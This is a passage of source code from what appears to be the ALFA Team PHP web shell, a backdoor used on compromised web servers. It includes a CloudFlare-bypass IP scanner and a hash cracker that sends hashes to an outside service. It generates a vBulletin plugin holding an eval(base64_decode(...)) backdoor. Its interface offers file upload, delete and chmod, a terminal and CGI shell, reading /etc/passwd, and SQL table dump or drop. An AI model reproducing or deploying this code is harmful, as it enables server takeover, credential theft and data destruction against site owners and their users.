<p><div class='txtfont'>Target:</div> <input type='text' size=30 name='url' style='text-align:center;' placeholder=\"target.com\"> <input type='submit' name='go' value=' ' /></p></form></center>";
if($_POST['alfa2'] && $_POST['alfa2'] == '>>'){
$fefubzei572d4e421e5e6b9bc11d815e8a027112 = $_POST['alfa1'];
if(!preg_match('/^(https?):\/\/(w{3}|w3)\./i', $fefubzei572d4e421e5e6b9bc11d815e8a027112)){
$fefubzei572d4e421e5e6b9bc11d815e8a027112 = preg_replace('/^(https?):\/\//', '', $fefubzei572d4e421e5e6b9bc11d815e8a027112);
$fefubzei572d4e421e5e6b9bc11d815e8a027112 = "http://www.".$fefubzei572d4e421e5e6b9bc11d815e8a027112;
}
$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 = @get_headers($fefubzei572d4e421e5e6b9bc11d815e8a027112, 1);
$patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3 = $afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4['Server'];
$lrvvwdgt960ab0adc680f43e916de7c03ef2e60d = array('owa.','2tty.','m.','gw.','mx1.','store.','1','2','vb.','news.','download.','video','cpanel.', 'ftp.', 'server1.', 'cdn.', 'cdn2.', 'ns.', 'ns3.', 'mail.', 'webmail.', 'direct.', 'direct-connect.', 'record.', 'ssl.', 'dns.', 'help.', 'blog.', 'irc.', 'forum.', 'dl.', 'my.', 'cp.', 'portal.', 'kb.', 'support.','search.', 'docs.', 'files.', 'accounts.', 'secure.', 'register.', 'apps.', 'beta.', 'demo.', 'smtp.', 'ns2.', 'ns1.', 'server.', 'shop.', 'host.', 'web.', 'cloud.', 'api.', 'exchange.', 'app.', 'vps.', 'owa.', 'sat.', 'bbs.', 'movie.', 'music.', 'art.', 'fusion.', 'maps.', 'forums.', 'acc.', 'cc.', 'dev.', 'ww42.', 'wiki.', 'clients.', 'client.','books.','answers.','service.','groups.','images.','upload.','up.','tube.','users.','admin.','administrator.','private.','design.','whmcs.','wp.','wordpress.','joomla.','vbulletin.','test.','developer.','panel.','contact.');
if(preg_match('/^(https?):\/\/(w{3}|w3)\./i', $fefubzei572d4e421e5e6b9bc11d815e8a027112, $jjpcsdkk9c28d32df234037773be184dbdafc274)){
if($jjpcsdkk9c28d32df234037773be184dbdafc274[2] != 'www'){$fefubzei572d4e421e5e6b9bc11d815e8a027112 = preg_replace('/^(https?):\/\//', '', $fefubzei572d4e421e5e6b9bc11d815e8a027112);}else{
$fefubzei572d4e421e5e6b9bc11d815e8a027112 = explode($jjpcsdkk9c28d32df234037773be184dbdafc274[0], $fefubzei572d4e421e5e6b9bc11d815e8a027112);
$fefubzei572d4e421e5e6b9bc11d815e8a027112 = $fefubzei572d4e421e5e6b9bc11d815e8a027112[1];}}
if(is_array($patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3))$patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3 = $patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3[0];
echo __pre();
if(preg_match('/cloudflare/i', $patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3))
echo "\n[+] CloudFlare detected: {$patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3}\n<br>";
else
echo "\n[+] CloudFlare wasn't detected, proceeding anyway.\n";
echo '[+] CloudFlare IP: ' . is_ipv4(gethostbyname($fefubzei572d4e421e5e6b9bc11d815e8a027112)) . "\n\n<br><br>";
echo "[+] Searching for more IP addresses.\n\n<br><br>";
for($fyyftmba9dd4e461268c8034f5c8564e155c67a6=0;$fyyftmba9dd4e461268c8034f5c8564e155c67a6<count($lrvvwdgt960ab0adc680f43e916de7c03ef2e60d);$fyyftmba9dd4e461268c8034f5c8564e155c67a6++){
$svjurwzc98defd6ee70dfb1dea416cecdf391f58 = $lrvvwdgt960ab0adc680f43e916de7c03ef2e60d[$fyyftmba9dd4e461268c8034f5c8564e155c67a6] . $fefubzei572d4e421e5e6b9bc11d815e8a027112;
$jywhuplv957b527bcfbad2e80f58d20683931435 = is_ipv4(gethostbyname($svjurwzc98defd6ee70dfb1dea416cecdf391f58));
if($jywhuplv957b527bcfbad2e80f58d20683931435 == '(Null)')
continue;
echo "Trying {$svjurwzc98defd6ee70dfb1dea416cecdf391f58}: {$jywhuplv957b527bcfbad2e80f58d20683931435}\n<br>";
}
echo "\n[+] Finished.\n<br>";
}
echo '</div>';
alfafooter();
}
function is_ipv4($jywhuplv957b527bcfbad2e80f58d20683931435){
return filter_var($jywhuplv957b527bcfbad2e80f58d20683931435, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ? $jywhuplv957b527bcfbad2e80f58d20683931435 : '(Null)';
}
function __alert($fwekvgvg03c7c0ace395d80182db07ae2c30f034){
echo '<center>'.__pre().$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'</center>';
}
function create_table($sfmsaibm8d777f385d3dfec8815d20f7496026dc){
echo '<table border="1">';
foreach ($sfmsaibm8d777f385d3dfec8815d20f7496026dc as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){
$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5 = array();
foreach($jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf as $damiszkt8ce4b16b22b58894aa86c421e8759df3 => $hvlrcxnj9e3669d19b675bd57058fd4664205d2a){
$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5[$damiszkt8ce4b16b22b58894aa86c421e8759df3] = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a;
}
echo "<tr><td><div class='tbltxt'>".$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5['tdName']."</div></td><td><input type='text' id='".$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5['id']."' name='".$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5['inputName']."' ".($vmwhayoqf1f713c9e000f5d3f280adbd124df4f5['placeholder']?'placeholder':'value')."='".$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5['inputValue']."' size='".$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5['inputSize']."' ".($vmwhayoqf1f713c9e000f5d3f280adbd124df4f5['disabled']?'disabled':'')."></td></tr>";
}
echo '</table>';
}
function alfaphp2xml(){
alfahead();
AlfaNum(8,9,10,7,6,5,4,3);
echo "<div class=header><center><p><div class='txtfont_header'>| Shell For vBulletin |</div></p><form onsubmit=\"g('php2xml',null,this.code.value,'>>'); return false;\" method='post'>
<p><br><textarea rows='12' cols='70' type='text' name='code' placeholder=\"insert your shell code\"></textarea><br/><br/>
<input type='submit' name='go' value=' ' /></p></form></center>";
if($_POST['alfa2']&&$_POST['alfa2']=='>>'){
echo __pre()."<p><center><textarea rows='10' name='users' cols='80'>";
echo '<?xml version="1.0" encoding="ISO-8859-1"?><plugins><plugin active="1" product="vbulletin"><title>vBulletin</title><hookname>init_startup</hookname><phpcode><![CDATA[if (strpos($_SERVER[\'PHP_SELF\'],"subscriptions.php")){eval(base64_decode(\''.__ZW5jb2Rlcg($_POST['alfa1']).'\'));exit;}]]></phpcode></plugin></plugins>';
echo '</textarea></center></p>';
}
echo '</center></div>';
alfafooter();
}
function alfacpcrack(){
alfahead();
echo '<div class=header><center><p><div class="txtfont_header">| Hash Tools |</div></p><h3><a href=javascript:void(0) onclick="g(\'cpcrack\',null,\'dec\')">| DeCrypter | </a><a href=javascript:void(0) onclick="g(\'cpcrack\',null,\'analyzer\')">| Hash Analyzer | </a></h3></center>';
if($_POST['alfa1']=='dec'){
$yrfeizku66270707424a729c3e557fceb03f45c9 = array('md5'=>'MD5','md4'=>'MD4','sha1'=>'SHA1','sha256'=>'SHA256','sha384'=>'SHA384','sha512'=>'SHA512','ntlm'=>'NTLM');
echo '<center><div class="txtfont_header">| DeCrypter |</div><br><br>
<form onsubmit="g(\'cpcrack\',null,\'dec\',this.md5.value,\'>>\',this.alg.value); return false;"><div class="txtfont">Decrypt Method:</div> <select name="alg" style="width:100px;">';
foreach($yrfeizku66270707424a729c3e557fceb03f45c9 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){echo('<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'">'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>');}
echo'</select><input type="text" placeholder="Hash" name="md5" size="60" id="text" /> <input type="submit" value=" " name="go" /></form></center><br>';
if($_POST['alfa3'] == '>>'){
$horyspio0800fc577294c34e0b28ad2839435945 = $_POST['alfa2'];
if(!empty($horyspio0800fc577294c34e0b28ad2839435945)){
$gtwozuvn591131c751044a25b9add921693b419a = $_POST['alfa4'];
$ahfizhrg0c83f57c786a0b4a39efab23731c7ebc = "solevisible@gmail.com";
$nndigmblc13367945d5d4c91047b3b50234aa7ab = "7b9fa79f92c3cd96";
$nyvfphvm42aefbae01d2dfd981f7da7d823d689e = "https://md5decrypt.net/Api/api.php?hash=".$horyspio0800fc577294c34e0b28ad2839435945."&hash_type=".$gtwozuvn591131c751044a25b9add921693b419a."&email=".$ahfizhrg0c83f57c786a0b4a39efab23731c7ebc."&code=".$nndigmblc13367945d5d4c91047b3b50234aa7ab;
$ldpkhdqbbd86bced84fb3aef951fb07de8c533c7 = @file_get_contents($nyvfphvm42aefbae01d2dfd981f7da7d823d689e);
if($ldpkhdqbbd86bced84fb3aef951fb07de8c533c7==''){
$oirhhzwgb5eda0a74558a342cf659187f06f746f = new AlfaCURL();
$ldpkhdqbbd86bced84fb3aef951fb07de8c533c7 = $oirhhzwgb5eda0a74558a342cf659187f06f746f->Send($nyvfphvm42aefbae01d2dfd981f7da7d823d689e);
}
echo __pre().'<center>';
switch($ldpkhdqbbd86bced84fb3aef951fb07de8c533c7){
	case('CODE ERREUR : 001'):echo "<b><font color='red'>You exceeded the 400 allowed request per day</font></b>";break;
	case('CODE ERREUR : 003'):echo "<b><font color='red'>Your request includes more than 400 hashes.</font></b>";break;
	case('CODE ERREUR : 004'):echo "<b><font color='red'>The type of hash you provide in the argument hash_type doesn't seem to be valid</font></b>";break;
	case('CODE ERREUR : 005'):echo "<b><font color='red'>The hash you provide doesn't seem to match with the type of hash you set.</font></b>";break;
}
if(substr($ldpkhdqbbd86bced84fb3aef951fb07de8c533c7,0,4)!='CODE'&&$ldpkhdqbbd86bced84fb3aef951fb07de8c533c7!=''){
echo "<b>Result: <font color='green'>".$ldpkhdqbbd86bced84fb3aef951fb07de8c533c7."</font></b>";
}elseif(substr($ldpkhdqbbd86bced84fb3aef951fb07de8c533c7,0,4)!='CODE'){
echo "<font color='red'>NoT Found</font><br />";
}
echo('</center>');
}
}
}
if($_POST['alfa1']=='analyzer'){
echo '<center><p><div class="txtfont_header">| Hash Analyzer |</div></p>
<form onsubmit="g(\'cpcrack\',null,\'analyzer\',this.hash.value,\'>>\');return false;">
<div class="txtfont">Hash: </div> <input type="text" placeholder="Hash" name="hash" size="60" id="text" /> <input type="submit" value=" " name="go" /></form></center><br>';
if($_POST['alfa3'] == '>>'){
$horyspio0800fc577294c34e0b28ad2839435945 = $_POST['alfa2'];
if(!empty($horyspio0800fc577294c34e0b28ad2839435945)){
$qqhrnrcwf6e57c9de709e45feb0d955351f53548 = new AlfaCURL();
$ldpkhdqbbd86bced84fb3aef951fb07de8c533c7 = $qqhrnrcwf6e57c9de709e45feb0d955351f53548->Send("https://md5decrypt.net/en/HashFinder/","post","hash={$horyspio0800fc577294c34e0b28ad2839435945}&crypt=Search");
echo(__pre().'<center>');
if(preg_match('#<fieldset class="trouve">(.*?)</fieldset>#',$ldpkhdqbbd86bced84fb3aef951fb07de8c533c7,$fwekvgvg03c7c0ace395d80182db07ae2c30f034)){
	echo('<font color="green">'.$fwekvgvg03c7c0ace395d80182db07ae2c30f034[1].'</font>');
}else{
	echo('<font color="red">Not Found...!</font>');
}
echo('</center><br>');
}
}
}
echo '</div>';
alfafooter();
}
function alfafooter(){
if(!isset($_POST['ajax'])){
echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0' >
<tr>
<td width='17%'><form onsubmit=\"if(this.f.value.trim().length==0)return false;editor(this.f.value,'mkfile','','','','file');this.f.value='';return false;\"><span class='footer_text'>Make File : </span><br><input class='dir' type='text' name='f' value=''> <input type='submit' value=' '></form></td>
<td width='21%'><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);this.d.value='';return false;\"><span class='footer_text'>Make Dir : </span><br><input class='dir' type='text' name='d' value=' '> <input type='submit' value=' '></form></td>
<td width='22%'><form onsubmit=\"g('FilesMan',null,'delete',this.del.value);this.del.value='';return false;\"><span class='footer_text'>Delete : </span><br><input class='dir' type='text' name='del' value=' '> <input type='submit' value=' '></form></td>
<td width='19%'><form onsubmit=\"if(this.f.value.trim().length==0)return false;editor(this.f.value,'chmod','','','','none');this.f.value='';return false;\"><span class='footer_text'>Chmod : </span><br><input class='dir' type=text name=f value=' '> <input type='submit' value=' '></form></td>
</tr>
<tr>
<td colspan='2'><form onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span class='footer_text'>Change Dir : </span><br><input class='foottable' id='footer_cwd' type='text' name='c' value='".htmlspecialchars($GLOBALS['cwd'])."'> <input type='submit' value=' '></form></td>
<td colspan='2'><form onsubmit=\"editor(this.file.value,'view','','','','file');return false;\"><span><span class='footer_text'>Read File : </span></span><br><input class='foottable' type='text' name='file' value='/etc/passwd'> <input type='submit' value=' '></form></td>
</tr>
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='alfaOpenPhpTerminal();return false;' class='foottable alfa_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='http://solevisible.com/icons/menu/terminal.svg'> Terminal</button><br></form></td>
</tr>
<tr>
<td colspan='4'><form onsubmit='u(this);return false;' name='footer_form' method='post' ENCTYPE='multipart/form-data'>
<input type='hidden' name='a' value='FilesMAn'>
<input type='hidden' name='c' value='" . $GLOBALS['cwd'] ."'>
<input type='hidden' name='ajax' value='true'>
<input type='hidden' name='alfa1' value='uploadFile'>
<input type='hidden' name='charset' value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./AlfaTeam &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>solevisible[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/solevisible'>@solevisible</a></span></div></td>
</tr>
</table>
</div>

<div id='options_window' style='background:rgba(0, 0, 0, 0.69);'><div class='editor-wrapper'><div class='editor-header'><div class='opt-title'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"options_window\");'></div><div onClick='editorClose(\"options_window\");' class='close-button'></div></div></div><div style='height:100%;' class='content_options_holder'><div class='options_tab'></div><div class='options_content' style='margin-left:14px;margin-right:30px;background:#000;overflow:auto;'></div></div></div></div>

<div id='database_window' style='background:rgba(0, 0, 0, 0.69);'><div class='editor-wrapper'><div class='editor-header'><div class='opt-title'>Sql Manager</div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"database_window\");'></div><div onClick='editorClose(\"database_window\");' class='close-button'></div></div></div><div class='content_options_holder' style='margin-left:14px;margin-right:30px;background:#000;max-height:90%;'><div class='sql-tabs'></div><div class='sql-contents' style='max-height: 85vh;'></div></div></div></div>

<div id='cgiloader'><div class='editor-wrapper'><div class='editor-header'><div class='opt-title'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"cgiloader\");'></div><div onClick='editorClose(\"cgiloader\");' class='close-button'></div></div></div><div id='cgiframe' style='position:relative;margin-left:14px;margin-right:30px;'><div class='terminal-tabs'></div><div style='height:90%;' class='terminal-contents'></div></div></div></div>
<div id='editor' style='display:none;'><div class='editor-wrapper'><div class='editor-header'><div class='editor-path'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"editor\");'></div><div onClick='editorClose(\"editor\");' class='close-button'></div></div></div><div onclick='historyPanelController(this);' mode='visible' class='history-panel-controller'><<</div><div class='editor-explorer'><div class='hheader'><div class='history-clear' onclick='clearEditorHistory();'>Clear all</div><div class='hheader-text'>History</div><div class='editor-search'><input type='text' style='text-align:center;' id='search-input' placeholder='search'></div></div><div class='history-list'></div></div><div class='editor-modal'><div class='editor-body'><div class='editor-content'><div class='editor-tabs'></div><div class='editor-content-holder'></div></div></div></div></div></div>
<div id='update-content'></div>
<div id='database_window-minimized' onclick='showEditor(\"database_window\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div class='minimized-text' style='top: 15px;'>Database</div></div></div>
<div id='options_window-minimized' onclick='showEditor(\"options_window\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 4px;' class='minimized-text'>Options</div></div></div>
<div id='editor-minimized' onclick='showEditor(\"editor\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 2px;' class='minimized-text'>Editor</div></div></div>
<div id='cgiloader-minimized' onclick='showEditor(\"cgiloader\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 12px;' class='minimized-text'>Cgi Shell</div></div></div>
<div id='rightclick_menu'>
  <a target='_blank' href='' name='newtab'><img src=\"http://solevisible.com/icons/menu/newtab.svg\"> Open in new tab</a>
  <a target='_blank' href='' name='link'><img src=\"http://solevisible.com/icons/menu/link.svg\"> Open file directly</a>
  <a href='javascript:void(0);' name='download'><img src=\"http://solevisible.com/icons/menu/download2.svg\"> Download</a>
  <a href='' name='view'><img src=\"http://solevisible.com/icons/menu/view.svg\"> View</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='view_archive'><img src=\"http://solevisible.com/icons/menu/view.svg\"> View Archive</a>
  <a href='' name='edit'><img src=\"http://solevisible.com/icons/menu/edit.svg\"> Edit</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"move\");' ftype='' path='' fname='' href='' href='' name='move'><img src=\"http://solevisible.com/icons/menu/move.svg\"> Move</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"copy\");' ftype='' path='' fname='' href='' name='copy'><img src=\"http://solevisible.com/icons/menu/copy.svg\"> Copy</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"rename\");' ftype='' path='' fname='' name='rename'><img src=\"http://solevisible.com/icons/menu/rename.svg\">  Rename</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"modify\");' ftype='' path='' fname='' name='modify'><img src=\"http://solevisible.com/icons/menu/time.svg\">  Modify</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"permission\");' name='permission'><img src=\"http://solevisible.com/icons/menu/key.svg\"> Change Permissions</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='compress'><img src=\"http://solevisible.com/icons/menu/resize.svg\"> Compress</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='extract'><img src=\"http://solevisible.com/icons/menu/increase.svg\"> Extract</a>
  <a href='javascript:void(0);' name='delete'><img src=\"http://solevisible.com/icons/menu/delete.svg\"> Delete</a>
</div>
<div id=\"filesman-tab-full-path\"></div>
<div id='alert-area' class='alert-area'></div>
<div class='cl-popup-fixed' style='display:none;'>
	<div id='shortcutMenu-holder'>
		<div class='popup-head'></div>
			<form autocomplete='off' onSubmit='return false;'>
				<label class='old-path-lbl'></label>
				<div style='overflow: hidden;white-space: nowrap;text-overflow: ellipsis;' class='old-path-content'></div>
				<label style='margin-top:10px;' class='new-filename-lbl'>New file name</label>
				<input type='text' name='fname'>
				<div class='perm-table-holder'>
					<table>
					   <tbody>
					      <tr>
					         <td><b>Mode</b></td>
					         <td>User</td>
					         <td>Group</td>
					         <td>World</td>
					      </tr>
					      <tr>
					         <td>Read</td>
					         <td><input type='checkbox' name='ur' value='4' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='gr' value='4' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='wr' value='4' onclick='calcperm();'></td>
					      </tr>
					      <tr>
					         <td>Write</td>
					         <td><input type='checkbox' name='uw' value='2' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='gw' value='2' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='ww' value='2' onclick='calcperm();'></td>
					      </tr>
					      <tr>
					         <td>Execute</td>
					         <td><input type='checkbox' name='ux' value='1' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='gx' value='1' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='wx' value='1' onclick='calcperm();'></td>
					      </tr>
					      <tr>
					         <td>Permission</td>
					         <td><input style='width:60px;' type='text' name='u' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"u\", [\"u\"]);'></td>
					         <td><input style='width:60px;' type='text' name='g' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"g\", [\"g\"]);'></td>
					         <td><input style='width:60px;' type='text' name='w' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"w\", [\"w\"]);'></td>
					      </tr>
					   </tbody>
					</table>
				</div>

			</form>
		<div class='popup-foot'>
			<button style='background: #2b5225;' name='accept' action='' onclick='alfaPopUpDoAction(this);'></button>
			<button style='background: #9e2c2c;' onclick='d.querySelector(\".cl-popup-fixed\").style.display=\"none\";'>Cancell</button>
		</div>
	</div>
</div>";?>
<script>
function alfaMysqlApi(e,t){var a={host:mysql_cache[e.db_id].host,user:mysql_cache[e.db_id].user,pass:mysql_cache[e.db_id].pass,db:e.db_target,db_id:e.db_id};if(e.hasOwnProperty("db_info"))for(var i in e.db_info)a[i]=e.db_info[i];var l={a:alfab64("Sql_manager_api"),c_:alfab64(c_),alfa1:alfab64(JSON.stringify(a))};if(e.hasOwnProperty("post"))for(var i in e.post.hasOwnProperty("alfa2")&&"load_data"!=e.post.alfa2&&"page"!=e.post.alfa2&&"edit"!=e.post.alfa2&&"delete"!=e.post.alfa2&&(d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-pager").innerHTML="",d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-reporter").innerHTML=""),e.post)l[i]=alfab64(e.post[i]);var r="";for(var o in l)r+=o+"="+l[o]+"&";alfaloader(e.db_id,"block"),_Ajax(d.URL,r,function(a){alfaloader(e.db_id,"none"),t(a)},!0,e.db_id)}function alfaMysqlFilterTable(e,t){setTimeout(function(){var a="",i="",l=(a="","");if(null!=e)a=e.getAttribute("target"),i=e.getAttribute("db_id"),l=e.value;else a=t.target,i=t.db_id,l=t.value;l=new RegExp(l,"i"),d.querySelectorAll("#"+i+" "+a+" ul > li").forEach(function(e){var t=e.querySelector(".mysql_tables");if(null==t)return!1;-1==(t=t.innerText).search(l)?e.style.display="none":e.style.display="block"})},200)}function alfaMysqlFilterAllTable(e,t){var a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" .mysql-tables input[name=filter_all]").value,l=d.querySelector("#"+a+" input[name=sql_count]").checked,r=[],o=[];if(d.querySelectorAll("#"+a+" .mysql-tables .list_container").forEach(function(e){var t=e.getAttribute("mode"),a=e.getAttribute("db_name");"no"==t&&r.push(a),o.push(a)}),r.length>0){if(0==i.length&&void 0===t)return!1;alfaMysqlApi({db_id:a,db_target:r[0],ajax_id:"mysql_get_all_tables",db_info:{databases:r},post:{alfa2:"load_all_tables",alfa3:l}},function(r){if(0!=r.length){for(var o in r=JSON.parse(r)){var n=o,s=d.querySelector("#"+a+" .cls-"+n);alfaMysqlMakeTblList(r[o],s,a,n,l)}void 0===t?alfaMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}):(e.setAttribute("mode","opened"),d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="http://solevisible.com/icons/menu/b_minus.png")}})}else if(void 0===t)for(var n in alfaMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}),o)alfaMysqlTableMode(a,o[n],"closed");else{var s="",c=e.getAttribute("mode");for(var n in"opened"==c?(e.setAttribute("mode","closed"),s="b_plus.png"):(e.setAttribute("mode","opened"),s="b_minus.png"),o)alfaMysqlTableMode(a,o[n],c);d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="http://solevisible.com/icons/menu/"+s}}function alfaMysqlTableMode(e,t,a){var i=d.querySelector("#"+e+" .cls-"+t),l="";void 0===a?(l=-1!=i.classList.value.indexOf("hide-db-tables")?"b_minus.png":"b_plus.png",i.classList.toggle("hide-db-tables")):"opened"==a?(l="b_plus.png",i.classList.add("hide-db-tables")):(l="b_minus.png",i.classList.remove("hide-db-tables")),d.querySelector("#"+e+" .cls-"+t+"-expander img").src="http://solevisible.com/icons/menu/"+l}function alfaMysqlExpander(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=e.getAttribute("sql_count"),l=d.querySelector("#"+a+" .cls-"+t);"loaded"==l.getAttribute("mode")?alfaMysqlTableMode(a,t):alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_get_tables",post:{alfa2:"load_tables",alfa3:i}},function(e){0!=e.length&&alfaMysqlMakeTblList(e=JSON.parse(e),l,a,t,i)})}function alfaMysqlTablesEvil(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i=e.getAttribute("mode");"checked"==i?(i=!1,e.setAttribute("mode","not")):(i=!0,e.setAttribute("mode","checked")),d.querySelectorAll("#"+a+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked=i})}function alfaMysqlTablesDumpDrop(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i="none";"dump"==e.value&&(i="block"),d.querySelector("#"+a+" "+t+" .dump-file-holder").style.display=i}function alfaMysqlTablesDumpDropBtn(e){var t=e.getAttribute("target"),a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=[],r=d.querySelector("#"+i+" input[name=sql_count]").checked,o=d.querySelector("#"+i+""+t),n=o.querySelector("select[name=tables_evil]").value,s=o.querySelector(".dump-file-holder input").value;d.querySelectorAll("#"+i+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked&&l.push(e.value)}),l.length>0&&alfaMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_query_evil",db_info:{tables:l,mode:n,dump_file:s},post:{alfa2:"dump_drop"}},function(e){0!=e.length&&(e=JSON.parse(e),"drop"==n?alfaMysqlMakeTblList(e,o,i,a,r):o.querySelector(".dump-file-holder").insertAdjacentHTML("beforeend","<div><a href='javascript:void(0);' onclick='g(\"FilesTools\",null,\""+s+'","download");\'><span>Download: '+s+"</span></a></div>"))})}function alfaMysqlMakeTblList(e,t,a,i,l){t.setAttribute("mode","loaded");var r='<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" db_id="'+a+'" placeholder="Filter Table" target=".cls-'+i+'" onkeyup="alfaMysqlFilterTable(this);" name="filter"></div></li>';for(var o in e)null!=e[o]&&(r+="<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='"+e[o].name+"'>&nbsp;<a class='db-opt-id' db_target='"+i+"' db_id='"+a+"' href='javascript:void(0);' onclick=\"alfaLoadTableData(this, '"+e[o].name+"')\"><span class='mysql_tables' style='font-weight:unset;'>"+e[o].name+"</span></a>"+(l?" <small><span style='font-weight:unset;' class='mysql_table_count'>("+e[o].count+")</span></small>":"&nbsp;")+"</div></li>");r+='</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="alfaMysqlTablesEvil(this);" db_id="'+a+'" class="db-opt-id" target=".cls-'+i+'" type="checkbox" class="db-opt-id"><select onchange="alfaMysqlTablesDumpDrop(this);" class="db-opt-id" db_id="'+a+'" target=".cls-'+i+'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="alfaMysqlTablesDumpDropBtn(this);return false;" db_id="'+a+'" class="db-opt-id" db_target="'+i+'" target=".cls-'+i+'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>',t.innerHTML=r,d.querySelector("#"+a+" .cls-"+i+"-expander img").src="http://solevisible.com/icons/menu/b_minus.png"}function alfaMysqlQuery(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" textarea[name=query]").value;alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_load_query_data",db_info:{query:i},post:{alfa2:"query"}},function(e){0!=e.length&&(e=JSON.parse(e),alfaMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.status?e.table:"",alfaMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0))})}function alfaMysqlReportBuilder(e,t){var a="";t.status||(a="<div><span>Error: </span><div style='padding-left: 50px;'><pre>"+t.error+"</pre></div></div>");var i="<div><span>Query:</span><div style='padding-left: 